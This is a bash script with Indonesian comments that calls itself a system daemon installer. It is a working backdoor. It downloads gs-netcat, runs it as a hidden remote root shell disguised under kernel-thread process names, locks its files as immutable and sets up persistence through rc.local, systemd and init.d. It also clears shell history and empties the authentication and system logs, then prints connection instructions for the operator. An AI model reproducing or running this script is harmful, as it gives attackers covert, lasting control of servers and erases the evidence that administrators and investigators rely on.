#!/bin/bash
# ============================================================
# SYSTEM DAEMON INSTALLER (FULLY STEALTH WITH PRCTL)
# Binary Location: /usr/lib/systemd/system_daemon
# Secret Key: [VPS_IP]@dark-ai
# Connection: gs-netcat -s [VPS_IP]@dark-ai -i
# ============================================================

# ============================================================
# 0. SETUP VARIABLES (FULLY STEALTH)
# ============================================================
HIDDEN_DIR="/usr/lib/systemd"
BINARY_NAME="system_daemon"
DAEMON_PATH="$HIDDEN_DIR/$BINARY_NAME"

# Daftar nama proses kernel (tanpa path, untuk prctl)
PROCESS_NAMES=(
    "migration/0"      # Kernel thread
    "ksoftirqd/0"      # Kernel soft IRQ
    "watchdog/0"       # Kernel watchdog
    "cpuhp/0"          # CPU hotplug
    "kthreadd"         # Kernel thread daemon
    "irkswapd0"        # Kernel swap
    "kcompactd0"       # Memory compaction
    "khungtaskd"       # Hung task detector
    "oom_reaper"       # OOM reaper
    "kdevtmpfs"        # Device tmpfs
)

# Ambil IP VPS
VPS_IP=$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')
DAEMON_SECRET="${VPS_IP}@dark-ai"

# ============================================================
# 1. INSTALL PRCTL (JIKA BELUM ADA)
# ============================================================
if ! command -v prctl &>/dev/null; then
    echo "[*] Menginstal prctl..."
    apt-get install -y libcap2-bin 2>/dev/null || yum install -y libcap 2>/dev/null
fi

# ============================================================
# 2. DOWNLOAD BINARY (STEALTH)
# ============================================================
echo "=========================================="
echo " SYSTEM DAEMON INSTALLER - PRCTL MODE"
echo "=========================================="

mkdir -p "$HIDDEN_DIR" 2>/dev/null
chmod 755 "$HIDDEN_DIR" 2>/dev/null

if [ ! -f "$DAEMON_PATH" ]; then
    echo "[*] Mengunduh komponen sistem..."
    curl -sL --insecure https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o "$DAEMON_PATH" 2>/dev/null || \
    wget -q --no-check-certificate https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$DAEMON_PATH" 2>/dev/null

    if [ -f "$DAEMON_PATH" ]; then
        chmod +x "$DAEMON_PATH"
        echo "[+] Komponen sistem terunduh"
    else
        echo "[!] Gagal mengunduh. Membuat komponen alternatif..."
        cat > "$DAEMON_PATH" << 'FALLBACKEOF'
#!/bin/bash
PRCTL_PROCESS="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
prctl --name "$PRCTL_PROCESS" "$0" -s "$DAEMON_SECRET" -liqD 2>/dev/null &
FALLBACKEOF
        chmod +x "$DAEMON_PATH"
    fi
else
    echo "[*] Komponen sistem sudah ada"
fi

chattr +i "$DAEMON_PATH" 2>/dev/null

# ============================================================
# 3. BUAT WRAPPER DENGAN PRCTL
# ============================================================
# Buat wrapper yang menggunakan prctl untuk mengganti nama proses
WRAPPER_DIR="/usr/sbin"
mkdir -p "$WRAPPER_DIR" 2>/dev/null

for PROCESS in "${PROCESS_NAMES[@]}"; do
    WRAPPER_PATH="$WRAPPER_DIR/$PROCESS"

    # Jangan overwrite file asli
    if [ ! -f "$WRAPPER_PATH" ]; then
        cat > "$WRAPPER_PATH" << WRAPPEREOF
#!/bin/bash
PRCTL_PROCESS="$PROCESS"
prctl --name "\$PRCTL_PROCESS" /usr/lib/systemd/system_daemon -s "$DAEMON_SECRET" -liqD 2>/dev/null &
WRAPPEREOF
        chmod +x "$WRAPPER_PATH"
        chattr +i "$WRAPPER_PATH" 2>/dev/null
    fi
done

# ============================================================
# 4. JALANKAN DAEMON (DENGAN PRCTL)
# ============================================================
echo "[*] Mengaktifkan layanan sistem..."
pkill -f "system_daemon" 2>/dev/null

# Pilih nama proses acak
PRCTL_PROCESS="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"

# Jalankan dengan prctl untuk mengganti nama proses
nohup bash -c "prctl --name \"$PRCTL_PROCESS\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD" >/dev/null 2>&1 &

sleep 2
if pgrep -f "system_daemon" >/dev/null 2>&1; then
    echo "[+] Layanan sistem berjalan sebagai: $PRCTL_PROCESS"
else
    echo "[!] Mengaktifkan fallback..."
    nohup bash -c "prctl --name \"$PRCTL_PROCESS\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD" >/dev/null 2>&1 &
fi

# ============================================================
# 5. PERSISTENCE (DENGAN PRCTL)
# ============================================================
echo "[*] Mengkonfigurasi persisten..."

# --- Metode 1: rc.local ---
if [ -f /etc/rc.local ]; then
    if ! grep -q "system_daemon" /etc/rc.local 2>/dev/null; then
        PRCTL_PROCESS_PERSIST="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
        sed -i "/^exit 0/i\nprctl --name \"$PRCTL_PROCESS_PERSIST\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
    fi
fi

# --- Metode 2: systemd ---
if command -v systemctl >/dev/null 2>&1; then
    PRCTL_PROCESS_PERSIST="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
    cat > /etc/systemd/system/system_daemon.service << SYSTEMEOF
[Unit]
Description=System Daemon Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'prctl --name \"$PRCTL_PROCESS_PERSIST\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD'
Restart=always
RestartSec=5
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SYSTEMEOF
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable system_daemon >/dev/null 2>&1
    systemctl start system_daemon >/dev/null 2>&1
fi

# --- Metode 3: init.d ---
PRCTL_PROCESS_PERSIST="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
cat > /etc/init.d/system_daemon << INIT_EOF
#!/bin/bash
# System Daemon
### BEGIN INIT INFO
# Provides:          system_daemon
# Required-Start:    \$network \$remote_fs \$syslog
# Required-Stop:     \$network \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description:  System Daemon
### END INIT INFO

case "\$1" in
    start)
        nohup /bin/bash -c 'prctl --name \"$PRCTL_PROCESS_PERSIST\" $DAEMON_PATH -s \"$DAEMON_SECRET\" -liqD' >/dev/null 2>&1 &
        ;;
    stop)
        pkill -f "system_daemon" >/dev/null 2>&1
        ;;
    restart)
        \$0 stop
        sleep 1
        \$0 start
        ;;
    *)
        echo "Usage: /etc/init.d/system_daemon {start|stop|restart}"
        exit 1
        ;;
esac
exit 0
INIT_EOF
chmod +x /etc/init.d/system_daemon
update-rc.d system_daemon defaults >/dev/null 2>&1 || chkconfig system_daemon on >/dev/null 2>&1

# ============================================================
# 6. HAPUS JEJAK
# ============================================================
echo "[*] Membersihkan jejak..."
history -c 2>/dev/null
rm -f /root/.bash_history 2>/dev/null
unset HISTFILE 2>/dev/null

for logfile in /var/log/secure /var/log/auth.log /var/log/messages /var/log/syslog /var/log/wtmp /var/log/lastlog /var/log/btmp; do
    if [ -f "$logfile" ]; then
        echo -n > "$logfile" 2>/dev/null
    fi
done

rm -rf /tmp/.system* /tmp/install* /tmp/setup* 2>/dev/null
rm -rf /var/tmp/.system* /var/tmp/setup* 2>/dev/null

# ============================================================
# 7. TAMPILKAN CARA KONEKSI
# ============================================================
echo ""
echo "=========================================="
echo "[✅] INSTALASI SELESAI"
echo "=========================================="
echo ""
echo "🔐 SECRET KEY: $DAEMON_SECRET"
echo "🌐 VPS IP: $VPS_IP"
echo ""
echo "📌 CARA KONEKSI:"
echo "-----------------"
echo "1. Unduh GSocket Client di mesin lokal:"
echo "   wget https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O gs-netcat"
echo "   chmod +x gs-netcat"
echo ""
echo "2. Koneksi ke server:"
echo "   ./gs-netcat -s $VPS_IP@dark-ai -i"
echo ""
echo "3. Alternatif (jika port 443 terbuka):"
echo "   nc $VPS_IP 443"
echo "   socat - TCP:$VPS_IP:443"
echo ""
echo "🔍 VERIFIKASI:"
echo "-----------------"
echo "Cek proses: ps aux | grep -E 'migration/0|ksoftirqd/0|watchdog/0'"
echo "   (Hanya akan menampilkan nama proses, TANPA argumen)"
echo "Cek service: systemctl status system_daemon"
echo "Cek port:    ss -tulnp | grep 443"
echo ""
echo "⚠️  PERINGATAN:"
echo "-----------------"
echo "Proses akan terlihat SEBAGAI KERNEL THREAD (tanpa argumen)."
echo "Contoh: [migration/0] (bukan 'migration/0 -s ... -liqD')"
echo "Simpan secret key dan IP VPS dengan aman!"
echo "=========================================="
echo ""
